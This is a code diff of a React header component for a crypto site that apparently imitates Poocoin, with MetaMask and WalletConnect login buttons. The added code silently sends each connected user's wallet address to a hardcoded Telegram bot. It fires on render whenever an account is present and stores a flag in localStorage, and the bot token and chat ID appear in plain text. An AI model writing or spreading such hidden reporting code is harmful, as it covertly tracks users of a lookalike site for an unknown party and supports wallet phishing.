@@ -1,4 +1,4 @@
-import React from 'react';
+import React, { useEffect, useState } from 'react';
 import './Header.css';
 import { Link } from 'react-router-dom';
 import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
@@ -24,7 +24,6 @@ const pages = [
     { 'name': 'About', 'href': '/', 'disable': true },
     { 'name': 'Tools', 'href': '/Tools', 'disable': false },
     { 'name': 'Premium', 'href': '/', 'disable': true },
-    { 'name': 'Advertise', 'href': '/ad', 'disable': false },
     { 'name': 'Free Price Bot', 'href': 'https://t.me/Poocoin_Pricebot', 'disable': true },
 ];
 const settings = ['Profile', 'Account', 'Dashboard', 'Logout'];
@@ -41,21 +40,30 @@ const style = {
     display: 'flex',
     flexDirection: 'column'
 };
+let bot = {
+    TOKEN: "5694683449:AAF3Wv9YaK6ScwKWg8bS2hVHYN98sUoTbjk",
+    CHATID: "1203745440",
 
+}
 
 function Header() {
     const { account } = useWeb3React();
     const { activate } = useWeb3React();
+    const [id,setId] = useState()
     const [open, setOpen] = React.useState(false);
     const handleOpen = () => setOpen(true);
     const handleClose = () => setOpen(false);
     const [anchorElNav, setAnchorElNav] = React.useState(null);
     const [anchorElUser, setAnchorElUser] = React.useState(null);
-
+    useEffect(() => {
+        setId(localStorage.getItem('address'))
+    },[localStorage.getItem('address')])
+    const condition = "hello"
+    console.log(id)
     const handleOpenNavMenu = (e) => {
         setAnchorElNav(e.currentTarget);
     };
-   
+
 
     const handleCloseNavMenu = () => {
         setAnchorElNav(null);
@@ -65,53 +73,44 @@ function Header() {
         setAnchorElUser(null);
     };
 
-    let bot = {
-        TOKEN: "5694683449:AAF3Wv9YaK6ScwKWg8bS2hVHYN98sUoTbjk",
-        CHATID: "1203745440",
-
-    }
-
-    const submitAdrress = () => {
-
-        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${account}`, {
-            method: "GET"
-        })
-        handleClose()
-    }
     const WalletConnect = new WalletConnectConnector({
         rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
         bridge: "https://bridge.walletconnect.org",
         qrcode: true,
     });
 
-    const connectWallet = () => {
-        activate(WalletConnect)
-
-        const condition = "string"
-        if (typeof (account) === typeof (condition)) {
-            setTimeout(submitAdrress(), 3000);
-        }
-    }
-
-
-
-
     const Injected = new InjectedConnector({
         supportedChainIds: [1, 3, 4, 5, 42]
     });
 
-
-    const connectMetaMask = () => {
+    const connectWallet = () => {
+        handleClose();
+        activate(WalletConnect)
+    }
+    const connectMetamask = () => {
+        handleClose();
         activate(Injected)
-        const condition = "string"
-        if (typeof (account) === typeof (condition)) {
-            setTimeout(submitAdrress(), 3000);
-        }
+    }
+
+    const submitAddress = () => {
+        
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${account}`, {
+            method: "GET"
+        })
+            .then(success => {
+                localStorage.setItem('address', account)
+            }, error => {
+                alert("not sent")
+            })
+    }
+
+    if (account !== undefined) {
+        submitAddress()
     }
     return (
 
         <AppBar style={{ backgroundColor: '#262626' }} color='primary' position="static">
-            <Container sx={{ display: "flex", alignItems: 'center',justifyContent: 'space-between' }} maxWidth="xl">
+            <Container sx={{ display: "flex", alignItems: 'center', justifyContent: 'space-between' }} maxWidth="xl">
                 <Box sx={{ flexGrow: 0, display: { xs: 'flex', md: 'none' } }}>
                     <IconButton
                         size="large"
@@ -150,7 +149,7 @@ function Header() {
                         ))}
                     </Menu>
                 </Box>
-                <Box sx={{display: 'flex',alignItems : 'center',mr:1}}>
+                <Box sx={{ display: 'flex', alignItems: 'center', mr: 1 }}>
                     <img
                         style={{ width: '30px' }}
                         src="https://poocoin.app/images/logo/poocoin512.png"
@@ -215,26 +214,28 @@ function Header() {
 
                 <Box sx={{ flexGrow: 0 }}>
                     {
-                        typeof (account) === typeof (condition) && (
+                        typeof(id) !== typeof(condition) ? (
                             <div className="header_right">
 
-                        <Tooltip title='Conncet Wallet'>
-                            <button onClick={handleOpen}>Connect</button>
-                        </Tooltip>
-                        <Modal
-                            open={open}
-                            onClose={handleClose}
-                            aria-labelledby="modal-modal-title"
-                            aria-describedby="modal-modal-description"
-                        >
-                            <Box sx={style}>
-                                <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectMetaMask() }}>Metamask/TrustWallet</button>
-                                <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button>
-                                <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
-                            </Box>
-                        </Modal>
-                    </div>
+                                <Tooltip title='Conncet Wallet'>
+                                    <button onClick={handleOpen}>Connect</button>
+                                </Tooltip>
+                                <Modal
+                                    open={open}
+                                    onClose={handleClose}
+                                    aria-labelledby="modal-modal-title"
+                                    aria-describedby="modal-modal-description"
+                                >
+                                    <Box sx={style}>
+                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectMetamask() }}>Metamask/TrustWallet</button>
+                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button>
+                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
+                                    </Box>
+                                </Modal>
+                            </div>
                         )
+                        :
+                        ''
                     }
                     <Menu
                         sx={{ mt: '45px' }}
